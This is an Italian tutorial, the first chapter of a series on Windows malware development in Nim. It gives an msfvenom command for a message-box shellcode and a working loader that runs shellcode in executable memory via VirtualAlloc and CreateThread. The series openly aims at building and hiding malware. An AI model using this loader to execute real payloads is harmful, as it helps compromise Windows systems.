# Capitolo 1: Shellcode

Questo è il primo capitolo di una serie dedicata al malware developing su Windows. Andremo a vedere  e implementare tecniche per creare malware e nasconderlo. Verrà usato principalmente [Nim](https://nim-lang.org/) come linguaggio d programmazione (è sottointeso che dovresti conoscerne _almeno_ le basi e averci fatto un progetto sopra)

## Cos'è uno shellcode?

Uno shellcode è un pezzettino di codie binario che ha in genere come scopo principale ottenere una shell remota su un computer (e da là il nome). Per generare un semplice shellcode con una message box si può usare [Metasploit](https://www.metasploit.com/) ed il seguente comando:

    msfvenom -p windows/x64/messagebox TEXT=hello TITLE=hello -f c -v SHELLCODE

Ma una shellcode non ha uso da sola, dobbiamo creare un wrapper per avvolgerla ed eseguirla su una determinata macchina.

## Come fare un wrapper?

Dato che il target del nostro malware è Windows dobbiamo usare le sue API. Con Nim, ci viene incontro [winim](https://khchen.github.io/winim/winim.html), il quale fornisce accesso alle API sotto forma di procs (funzioni). Ora che abbiamo gli strumenti, bisogna capire quali API usare. Il percorso che userò io oggi è il seguente:

- Crearci uno spazio in memoria che sia eseguibile, leggibile e scrivibile con `VirtualAlloc`
- Copiare il payload in quello spazio (con `copyMem`)
- Eseguire lo spazio creato prima con `CreateThread`

Il wrapper dovrebbe sembrare una cosa del genere:

    var shellcode: array[{inserisci lungezza shellcode qui!}, byte] = [byte {inserisci shellcode qui!}]
    let executable_memory = VirtualAlloc(nil, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
    copyMem(executable_memory, shellcode[0].addr, len(shellcode))
    let tHandle = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](executable_memory), nil, 0, cast[LPDWORD](0))
    defer: CloseHandle(tHandle)
    discard WaitForSingleObject(tHandle, -1)

Un po' di contesto sugli argomenti delle funzioni:

- [VirtualAlloc](https://learn.microsoft.com/it-it/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
- [CreateThread](https://learn.microsoft.com/it-it/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
- [CloseHandle](https://learn.microsoft.com/it-it/windows/win32/api/handleapi/nf-handleapi-closehandle)
- [WaitForSingleObject](https://learn.microsoft.com/it-it/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)

## Congratulazioni

Sei riuscito a creare il tuo primo malware!